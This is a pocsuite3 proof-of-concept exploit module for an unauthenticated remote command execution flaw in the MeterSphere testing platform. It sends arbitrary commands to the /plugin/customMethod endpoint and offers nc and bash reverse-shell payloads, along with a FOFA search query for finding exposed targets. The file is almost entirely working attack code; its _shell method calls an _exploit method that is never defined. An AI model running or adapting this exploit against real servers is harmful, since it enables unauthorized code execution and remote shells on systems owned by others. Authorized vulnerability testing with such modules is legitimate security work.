"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""
import re
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text

class DemoPOC(POCBase):
    vulID = '1'  
    author = ['PeiQi']
    name = 'MeterSphere customMethod 远程命令执行漏洞'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''2022年1月5日，知道创宇404积极防御实验团队发现了MeterSphere开源持续测试平台的一处漏洞，并向MeterSphere研发团队进行了反馈。通过该漏洞攻击者可以在未授权的情况下执行远程代码，建议MeterSphere平台用户，尤其是可通过公网访问的用户尽快进行升级修复
    '''
    appPowerLink = 'https://github.com/metersphere/metersphere'
    appName = 'MeterSphere'
    appVersion = 'v1.13.0 - v1.16.3'
    fofa_dork = {'fofa': 'app="MeterSphere"'} 
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("id", description='攻击时自定义命令')
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["payload"] = OptDict(default=payload, selected="nc")
        return o

    def _verify(self):
        result = {}
        url = self.url.rstrip('/') + "/plugin/customMethod"
        data = '{"entry":"Evil","request":"' + self.get_option("command")+ '"}'
        headers = {
            "Content-Type": "application/json"
        }
        resp = requests.post(url, data=data, headers=headers, timeout=5)
        try:
            if 'success' in resp.text and resp.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Cmd'] = self.get_option("command")
                result['VerifyInfo']['Response'] = re.findall(r'{"data":(.*?)"success',resp.text)[0]
        except Exception as ex:
            pass
        
        return self.parse_output(result)
    
    def _attack(self):
        result = {}
        url = self.url.rstrip('/') + "/plugin/customMethod"
        data = '{"entry":"Evil","request":"' + self.get_option("command") + '"}'
        headers = {
            "Content-Type": "application/json"
        }
        resp = requests.post(url, data=data, headers=headers, timeout=5)
        try:
            if 'success' in resp.text and resp.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Cmd'] = self.get_option("command")
                result['VerifyInfo']['Response'] = re.findall(r'{"data":(.*?)"success',resp.text)[0]
        except Exception as ex:
            pass

        return self.parse_output(result)

    def _shell(self):
        cmd = self.get_option("payload")
        self._exploit(cmd)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
